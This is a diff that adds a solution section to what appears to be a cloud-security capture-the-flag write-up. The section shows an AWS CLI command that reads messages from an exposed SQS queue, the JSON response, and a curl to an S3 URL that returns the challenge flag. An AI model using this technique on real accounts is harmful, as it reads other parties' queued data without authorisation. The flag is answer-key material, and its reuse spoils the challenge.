@@ -48,3 +48,27 @@ sqs.sendMessage(params, function(err, data) {
 });
 
 ```
+## Solution
+```bash
+aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 --attribute-names All --message-attribute-names All --max-number-of-messages 10
+```
+```json
+        {
+            "MessageId": "4283849c-74d4-4825-9227-5da464b23f0b",
+            "ReceiptHandle": "AQEBgnKZ95I3BiEISAe/De63+KS/yADoAemJ8e3a8ZHeqaWaUTTJaceNsnwf2vqFUOU/tJCVR7xtdj+CgUXQazQKuUzBKlAegWNfQJecGJB8A4qnFIYOpKPRfBCkQ8Fah7JINcisCKsl01D0sTcMLam0VREtifPFsr6GmgNoW0d/sLdYI5gIKoHgp8qJzhSSocrWkC2moQH18bVihmCe0qMSYZ2rBHYnAUjsCxNHBFCC1UjpZYDTUK+Z74sn8j6mQuAnq+5mpHvHog9BrRqrhzSEl2MzdrF5ETG6Fi9MXDoyONlHNsPaFceUjM1Hyx8M+FAm78Sv3MFn6+aRmv/RBqvKuU8iKAZHCAtNBOru/Kex6RM+VbzCprocSnGZe3Ys6KCjnw7FUhJmSLi/1/v3jvxDbG8QWrR/CUUM+a+AYQ9VLa8=",
+            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
+            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}",
+            "Attributes": {
+                "SenderId": "AROARK7LBOHXGHGQ5XCT5:tbic-wiz-send-flag-to-sqs-8d265a4",
+                "ApproximateFirstReceiveTimestamp": "1691583093512",
+                "ApproximateReceiveCount": "1",
+                "SentTimestamp": "1691582488541",
+                "AWSTraceHeader": "Root=1-64d38018-6a56d23a731e0cbe6ed85687;Parent=1e4dbd311c45e826;Sampled=0;Lineage=037bed70:0"
+            }
+        }
+```
+
+```bash
+ curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
+{wiz:you-are-at-the-front-xxxxxxxxxxx}
+```
